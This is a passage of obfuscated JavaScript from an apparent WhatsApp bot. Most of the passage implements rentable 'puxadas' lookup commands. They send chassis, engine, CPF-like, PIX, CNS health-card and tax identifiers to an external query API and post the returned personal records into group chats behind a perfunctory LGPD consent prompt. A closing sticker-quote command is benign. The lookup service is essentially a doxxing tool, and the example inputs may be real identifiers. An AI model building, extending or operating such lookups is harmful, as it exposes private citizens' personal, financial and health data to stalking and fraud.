                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x48059a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x2288f5 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x48059a, _0x2288f5);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x985b59 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x985b59);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x2d00e8 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x2d00e8);
                }
              } catch (_0x41d153) {
                console.log(_0x41d153);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "chassi":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "chassi 9BD358A1NKYJ32306");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x15474a = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x331563 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x15474a, _0x331563);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x10950e = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x10950e);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x45aa21 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x45aa21);
                }
              } catch (_0x94e56d) {
                console.log(_0x94e56d);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "motor":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "motor 5526802372669358");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x14a8be = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x6e62ef = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x14a8be, _0x6e62ef);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x171ff6 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x171ff6);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x64cd1 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x64cd1);
                }
              } catch (_0x3f0842) {
                console.log(_0x3f0842);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "beneficios":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "beneficios 340240489");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x4ce507 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x556550 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x4ce507, _0x556550);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4be79c = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4be79c);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x31df3e = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x31df3e);
                }
              } catch (_0x231cf6) {
                console.log(_0x231cf6);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "impostos":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "impostos 45317828791");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x1954fa = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x13c03e = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x1954fa, _0x13c03e);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4f3439 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4f3439);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xf33861 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0xf33861);
                }
              } catch (_0x2d1830) {
                console.log(_0x2d1830);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "nascimento":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "nascimento 45317828791");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x1a67a4 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x5f263b = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x1a67a4, _0x5f263b);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x184cdf = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x184cdf);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x1617a6 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x1617a6);
                }
              } catch (_0x21ece8) {
                console.log(_0x21ece8);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "pix":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "pix 45317828791");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0xb2f3b0 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x10a1cf = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0xb2f3b0, _0x10a1cf);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x526729 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x526729);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xaaeae6 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0xaaeae6);
                }
              } catch (_0x3fe90e) {
                console.log(_0x3fe90e);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "cns":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "cns 8197704808015598");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x3508e9 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x4b2bab = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x3508e9, _0x4b2bab);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x342d83 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x342d83);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x4ceb85 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x4ceb85);
                }
              } catch (_0x4d594b) {
                console.log(_0x4d594b);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "cns2":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "cns2 8197704808015598");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x326f58 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x41dbb5 = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x326f58, _0x41dbb5);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x158435 = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x158435);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x21e595 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x21e595);
                }
              } catch (_0x3b91ef) {
                console.log(_0x3b91ef);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "correios":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "correios 79560970");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x4fabde = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x1d52eb = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x4fabde, _0x1d52eb);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x1e818a = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x1e818a);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0x17c904 = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0x17c904);
                }
              } catch (_0x4b87f5) {
                console.log(_0x4b87f5);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "dominio":
              try {
                if (!_0x38b1b5 && !_0x101fdd && !_0x2a5ff3) {
                  return _0x403602("❌ Grupo não autorizado ❌\nEste tipo de comando só pode ser utilizado com o modo puxadas ativo. Para adquirir acesso, entre em contato com o dono: " + numerodono_ofc + " ou se você for, apenas ative o modo puxadas com " + _0x1d93be + "modopuxadas 1");
                }
                if (!_0xd20756 && !_0x38b1b5) {
                  return _0x403602("Este comando só deve ser utilizado em Grupos. ou Por Usuários Vips!");
                }
                if (!_0x1d6557) {
                  return _0x403602("Desculpe, parece que você esqueceu de informar o que deseja consultar. Por exemplo: " + _0x1d93be + "dominio link");
                }
                if (!_0x27b8b3) {
                  return _0x248b92("📄 TERMOS 📄\nAo utilizar quaisquer dados pessoais, você concorda com a Lei Geral de Proteção de Dados Pessoais (LGPD - Lei nº 13.709), aprovada em agosto de 2018.", "", "CONCORDA COM NOSSOS TERMOS", _0x1d93be + "termosok");
                }
                const _0x4be7b0 = {
                  text: "➠ Consultando: " + _0x1d6557 + "\n*🐎 " + NomeDoBot + " - PUXADAS*\n*⚠️ AGUARDE UM MOMENTO ⚠️*"
                };
                const _0x395ede = {
                  quoted: _0x302296
                };
                var {
                  key: _0x3808b5
                } = await _0x263319.sendMessage(_0x4f1071, _0x4be7b0, _0x395ede);
                consulta = await fetchJson(SITE_JEFF_APIS + "/consultas/" + _0x3dec88 + "?ddos=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x4ca9cc = {
                  text: "📄 𓂀 " + NomeDoBot + " 𝗣𝗨𝗫𝗔𝗗𝗔𝗦 𓂀\n\n" + consulta.resultado + "\n\n • 𝗨𝘀𝘂á𝗿𝗶𝗼: " + _0x55a6ac + "\n\n • 𝗕𝘆: " + NomeDoBot + "\n\n𝗤𝗨𝗘𝗥 𝗔𝗟𝗨𝗚𝗔𝗥 𝗢 𝗕𝗢𝗧?\n➠ " + numerodono_ofc,
                  edit: _0x3808b5
                };
                await _0x263319.sendMessage(_0x4f1071, _0x4ca9cc);
                if (!_0x1d6557) {
                  await sleep(1500);
                  const _0xbde8be = {
                    quoted: _0xa6b34
                  };
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "➠ A consulta foi enviada em seu privado.\n🐎 BOT X-BOT - PUXADAS\n✅ CONSULTA REALIZADA ✅"
                  }, _0xbde8be);
                }
              } catch (_0x50ee24) {
                console.log(_0x50ee24);
                _0x403602("⚠️ NÃO ENCONTRADO OU INVÁLIDO ⚠️");
              }
              break;
            case "qc":
            case "quotly":
            case "figuleg":
              if (!_0x1d6557) {
                return _0x403602("Ou coloque um texto na frente do comando");
              }
              const _0x1e7f7f = "" + _0x1d6557;
              let _0x2e4d91;
              let _0xc8c912;
              const _0x1216ec = _0x54d215 => {
                try {
                  const _0x46c687 = fs.readFileSync("DADOS/countmsg.json", "utf-8");
                  const _0x38ff32 = JSON.parse(_0x46c687);
                  for (const _0x466b78 of _0x38ff32) {
                    const _0x4df467 = _0x466b78.numbers.find(_0x21aefc => _0x21aefc.id === _0x54d215);
                    if (_0x4df467) {
                      return _0x4df467.nickname || _0x4df467.nick || _0x54d215;
                    }
                  }
                  return _0x54d215;
                } catch (_0x5b010a) {
                  console.error("errei fui xbot:", _0x5b010a);
                  return _0x54d215;
                }
              };
              if (_0x302296 && _0x302296.message && _0x302296.message.extendedTextMessage && _0x302296.message.extendedTextMessage.contextInfo && _0x302296.message.extendedTextMessage.contextInfo.quotedMessage) {
                const _0x387af7 = _0x302296.message.extendedTextMessage.contextInfo.participant;
                _0x2e4d91 = _0x1216ec(_0x387af7);
                try {
                  _0xc8c912 = await _0x263319.profilePictureUrl(_0x387af7);
                } catch {
                  _0xc8c912 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
              } else {
                _0x2e4d91 = _0x1216ec(_0x32e455);
                try {
                  _0xc8c912 = await _0x263319.profilePictureUrl(_0x32e455);
                } catch {
                  _0xc8c912 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
              }
              const {
                writeExifImg: _0x4c97e8,
                imageToWebp: _0x2d0291
              } = require("./lib/exif");
              _0x263319.sendImageAsSticker = async (_0x5561ab, _0x5c11bd, _0x35effc, _0xffdfba = {}) => {
                let _0x18f0e2 = Buffer.isBuffer(_0x5c11bd) ? _0x5c11bd : /^data:.?\/.?;base64,/i.test(_0x5c11bd) ? Buffer.from(_0x5c11bd.split`, `[1], "base64") : /^https?:\/\//.test(_0x5c11bd) ? await await getBuffer(_0x5c11bd) : fs.existsSync(_0x5c11bd) ? fs.readFileSync(_0x5c11bd) : Buffer.alloc(0);
                let _0xbe32a8;
                if (_0xffdfba && (_0xffdfba.packname || _0xffdfba.author)) {
                  _0xbe32a8 = await _0x4c97e8(_0x18f0e2, _0xffdfba);
                } else {
                  _0xbe32a8 = await _0x2d0291(_0x18f0e2);
                }
                const _0x2c11ee = {
                  url: _0xbe32a8
                };
                const _0x517276 = {
                  sticker: _0x2c11ee,
                  ..._0xffdfba
                };
                const _0xb9036f = {
                  quoted: _0x35effc
                };
                await _0x263319.sendMessage(_0x5561ab, _0x517276, _0xb9036f);
                return _0xbe32a8;
              };
              const _0x2797fa = {
                url: _0xc8c912
              };
